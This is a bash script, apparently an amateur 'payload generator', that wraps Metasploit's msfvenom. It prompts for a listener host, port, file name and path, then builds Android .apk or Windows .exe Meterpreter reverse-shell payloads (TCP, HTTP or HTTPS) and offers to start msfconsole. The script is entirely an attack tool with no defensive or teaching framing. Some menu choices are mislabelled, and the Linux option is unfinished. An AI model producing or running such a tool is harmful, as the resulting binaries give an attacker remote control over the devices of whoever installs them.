#!/bin/bash
#this is the code for executing a shell script
clear
echo -e "\n\n\n\n\n"
echo "                  *****************************************************"
echo "                  **  **      ** ****** ***   **    **   ***     *** **"
echo "                  **   **    **  *      ** ** **   ** ** ****   **** **"
echo "                  **    **  **   ****   **  ****   ** ** ** ** ** ** **"
echo "                  **      **     ****** **   ***    **   **   **  ** **" 
echo "                  *****************************************************"
RED='\033[0;31m'#red color
NC='\033[0m'#no color
echo -e "\n\n\a${RED}welcome to payload generator${NC} "
while true 
 do 
echo -e "\n[1] continue \n[2] exit"
read -p "enter your choice:" x
if [ $x -eq 2 ]
then
 echo "$x is your choice"
 exit 0
else
 echo "is Metasploit present in your system(y/n)"
 read z
 if [ "$z" != 'y' ];then 
  echo "please install metasploit and try again!" 
  exit 0
 else
 echo -e "\nenter lhost:" 
 read lhst
 echo -e "\nenter lport:"
 read lprt
 echo -e "\nenter payload name:"
 read name  
 echo -e "\nenter path:(ex: /root/Downloads)"
 read path
 echo -e "\nchoose your payload:"
 echo -e "\n[1]android\n[2]windows\n[3]linux\n[4]exit"
 echo -e "\nenter your choice:"
 read y
 echo -e "\n[1]reverse_tcp\n[2]reverse_http\n[3]reverse_https\n[4]exit"
 echo -e "\nenter your choice:"
 read z
 #echo -e "\nPayload generator: " 
  while :
   do
  case $y in 1)
    while :
       do
        case $z in 1)
               msfvenom -p android/meterpreter/reverse_tcp lhost=$lhst lport=$lprt -o $path/$name.apk
  #echo "payload sucessfully generated "
               echo -e "\ndo you want to start console:(y/n)" 
               read ans
               if [ "$ans" == 'y' ]
               then
                 msfconsole
               else
                 exit 0
               fi
        ;;
       2) 
              msfvenom -p android/meterpreter/reverse_http lhost=$lhst lport=$lprt -o $path/$name.apk
              echo -e "\ndo you want to start console:(y/n)" 
              read ans
              if [ "$ans" == 'y' ]
              then
                msfconsole
              else
                exit 0
              fi
        ;;
       3)
               msfvenom -p android/meterpreter/reverse_http lhost=$lhst lport=$lprt -o $path/$name.apk 
               echo -e "\ndo you want to start console:(y/n)" 
               read ans
               if [ "$ans" == 'y' ]
               then
                 msfconsole
               else
                 exit 0
               fi
       ;;
      4)
             echo -e"THANK YOU"
             exit 0
       ;;
      *)
            echo -e "THANK YOU"
            exit 0
       ;;
      esac
     done
  ;;
  2)
    while :
     do 
       case $z in 1) 
        #echo -e "\n under updates"
          msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhst lport=$lprt -o $path/$name.exe
          echo -e "\ndo you want to start console:(y/n)" 
          read ans
          if [ "$ans" == 'y' ]
          then
           msfconsole
          else
           exit 0
          fi
       ;;
       2)
         msfvenom -p windows/meterpreter/reverse_http lhost=$lhst lport=$lprt -o $path/$name.exe
         echo -e "\ndo you want to start console:(y/n)" 
         read ans
         if [ "$ans" == 'y' ]
         then
          msfconsole
         else
          exit 0
         fi
       ;;  
       3)
         msfvenom -p windows/meterpreter/reverse_https lhost=$lhst lport=$lprt -o $path/$name.exe
         echo -e "\ndo you want to start console:(y/n)" 
         read ans
         if [ "$ans" == 'y' ]
         then
           msfconsole
         else
           exit 0
         fi
       ;;
      *)
        echo -e "\nTHANK YOU"
        exit 0
        ;;
      esac
     done
  ;;
 3)
  echo -e "\n UNDER UPDATES"
  break
  ;;
 4)
  echo -e "\n THANK YOU"
  exit 0
  ;;
 *)
  echo -e "enter correct choice"
  break
  ;; 
 esac
 done
fi  
fi
done
